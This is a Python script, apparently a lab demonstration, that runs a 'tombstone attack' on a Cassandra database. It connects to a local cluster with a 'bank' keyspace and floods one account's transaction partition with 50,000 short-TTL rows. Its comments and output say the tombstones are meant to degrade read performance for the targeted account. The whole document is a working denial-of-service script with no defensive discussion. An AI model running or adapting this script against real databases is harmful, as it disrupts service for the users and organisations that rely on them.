from cassandra.cluster import Cluster
import uuid
import time
from datetime import datetime

# -------------------------
# CONFIGURATION
# -------------------------
ACCOUNT_ID = 1
TOTAL_INSERTS = 50000   # number of rows to generate
TTL_SECONDS = 5         # short TTL → creates tombstones quickly
SLEEP_BETWEEN_INSERTS = 0.002  # small delay to spread tombstones across SSTables


cluster = Cluster(["127.0.0.1"])
session = cluster.connect("bank")

print("Starting tombstone attack...")


query = session.prepare("""
INSERT INTO transactions
(account_id, tx_time, tx_id, amount)
VALUES (?, ?, ?, ?)
USING TTL ?
""")

start = time.time()


for i in range(TOTAL_INSERTS):

    session.execute(query, (
        ACCOUNT_ID,
        datetime.utcnow(),
        uuid.uuid4(),
        1.0,
        TTL_SECONDS
    ))

    
    time.sleep(SLEEP_BETWEEN_INSERTS)

    # progress indicator every 5000 rows
    if i > 0 and i % 5000 == 0:
        print(f"Inserted {i} rows...")

end = time.time()

print("\nDone inserting tombstone rows.")
print("Total time:", round(end-start, 2), "seconds")

print("\nWAIT about 15–30 seconds for TTL expiration.")
print("After expiration, tombstones will start affecting read performance on the targeted account.")